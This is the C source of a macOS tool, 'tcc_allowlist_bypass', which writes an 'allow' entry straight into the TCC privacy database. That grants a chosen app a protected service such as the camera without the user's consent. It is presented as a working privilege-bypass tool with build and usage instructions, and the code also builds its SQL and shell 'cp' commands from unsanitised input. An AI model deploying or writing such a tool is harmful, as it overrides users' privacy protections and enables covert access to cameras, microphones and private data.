/*
 * tcc_allowlist_bypass.c (final enhanced)
 *
 * Bypasses macOS TCC by inserting an “allow” entry for a specified bundle ID and service.
 * Usage (as root, SIP disabled):
 *   sudo ./tcc_allowlist_bypass <service> <bundle_id> [--dry-run]
 * Example:
 *   sudo ./tcc_allowlist_bypass kTCCServiceCamera com.apple.Terminal
 *
 * Compile on macOS:
 *   clang tcc_allowlist_bypass.c -o tcc_allowlist_bypass -framework CoreFoundation -framework Security -lsqlite3
 */

#include <stdio.h>  // For standard I/O functions
#include <stdlib.h> // For general utilities like malloc, free, etc.
#include <string.h> // For string manipulation functions
#include <time.h>   // For time-related functions
#include <sqlite3.h> // For SQLite database operations
#include <unistd.h> // For checking root privileges (geteuid)
#include <sys/stat.h> // For checking file existence and permissions

#define DEFAULT_DB_PATH "/Library/Application Support/com.apple.TCC/Tcc.db"
#define BACKUP_DB_PATH "/Library/Application Support/com.apple.TCC/Tcc.db.bak"

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s <service> <bundle_id> [--dry-run]\n", prog_name);
    fprintf(stderr, "Example: %s kTCCServiceCamera com.apple.Terminal\n", prog_name);
}

void backup_tcc_db(const char *db_path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cp %s %s", db_path, BACKUP_DB_PATH);
    if (system(cmd) == 0) {
        printf("[+] Backup created at %s\n", BACKUP_DB_PATH);
    } else {
        fprintf(stderr, "[-] Failed to create backup of TCC DB.\n");
    }
}

void rollback_tcc_db(const char *db_path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cp %s %s", BACKUP_DB_PATH, db_path);
    if (system(cmd) == 0) {
        printf("[+] Rolled back TCC DB from backup.\n");
    } else {
        fprintf(stderr, "[-] Failed to roll back TCC DB from backup.\n");
    }
}

int file_exists_and_writable(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        fprintf(stderr, "[-] File does not exist: %s\n", path);
        return 0;
    }
    if (access(path, W_OK) != 0) {
        fprintf(stderr, "[-] File is not writable: %s\n", path);
        return 0;
    }
    return 1;
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 4) {
        print_usage(argv[0]);
        return 1;
    }

    const char *service = argv[1];
    const char *bundle = argv[2];
    const char *db_path = getenv("TCC_DB_PATH") ? getenv("TCC_DB_PATH") : DEFAULT_DB_PATH;
    int dry_run = (argc == 4 && strcmp(argv[3], "--dry-run") == 0);
    sqlite3 *db;
    char *err = NULL;
    int rc;

    // Check for root privileges
    if (geteuid() != 0) {
        fprintf(stderr, "[-] This program must be run as root.\n");
        return 1;
    }

    // Validate input
    if (strlen(service) == 0 || strlen(bundle) == 0) {
        fprintf(stderr, "[-] Invalid arguments. Service and bundle ID cannot be empty.\n");
        return 1;
    }

    // Check if TCC database exists and is writable
    if (!file_exists_and_writable(db_path)) {
        return 1;
    }

    // Backup TCC database
    if (!dry_run) {
        backup_tcc_db(db_path);
    }

    // Open TCC database
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] Cannot open TCC DB at %s: %s\n", db_path, sqlite3_errmsg(db));
        rollback_tcc_db(db_path);
        sqlite3_close(db);
        return 1;
    }

    // Build SQL statement
    time_t now = time(NULL);
    char sql[1024];
    snprintf(sql, sizeof(sql),
             "INSERT OR REPLACE INTO access "
             "(service, client, client_type, allowed, prompt_count, csreq, policy_id, policy_subject, "
             "flags, last_modified) VALUES "
             "('%s','%s',0,1,1,NULL,NULL,NULL,0,%ld);",
             service, bundle, now);

    // Dry-run mode
    if (dry_run) {
        printf("[DRY-RUN] SQL statement: %s\n", sql);
        sqlite3_close(db);
        return 0;
    }

    // Execute SQL statement
    rc = sqlite3_exec(db, sql, NULL, 0, &err);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] SQL error: %s\n", err);
        sqlite3_free(err);
        rollback_tcc_db(db_path);
        sqlite3_close(db);
        return 1;
    }

    sqlite3_close(db);
    printf("[+] TCC DB modified: '%s' now allowed to use %s\n", bundle, service);
    return 0;
}
